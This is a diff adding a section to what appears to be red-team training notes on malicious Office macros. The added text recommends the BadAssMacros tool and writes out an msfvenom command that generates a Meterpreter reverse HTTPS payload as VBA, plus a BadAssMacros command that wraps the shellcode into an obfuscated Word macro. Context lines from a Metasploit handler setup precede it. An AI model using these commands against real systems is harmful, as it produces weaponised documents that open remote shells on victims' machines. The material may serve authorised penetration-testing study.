@@ -214,3 +214,16 @@ set lport 443
 ```bash
 exploit
 ```
+
+### BadAssMacros
+
+As usual this has been a massive 'from first principles' breakdown in order to check our understanding of the funamentals. In practice an exquisite tool exists to do most of the heavy lifting for us: `BadAssMacros`. The repo we get this from is here: https://github.com/Inf0secRabbit/BadAssMacros. See the `README.md` for a full breakdown of the flags.
+
+The following command provides some sane defaults that will generate the raw text of the VBA Macro which we need to insert into our Word doc. Obviously we will potentially need to adjust these to our use case:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.y LPORT=443 EXITFUNC=thread -f vbapplication > shellcode.txt
+```
+```powershell
+BadAssMacrosx86.exe -i shellcode.txt -w doc -p no -s indirect -c 10 -o macro.txt
+```
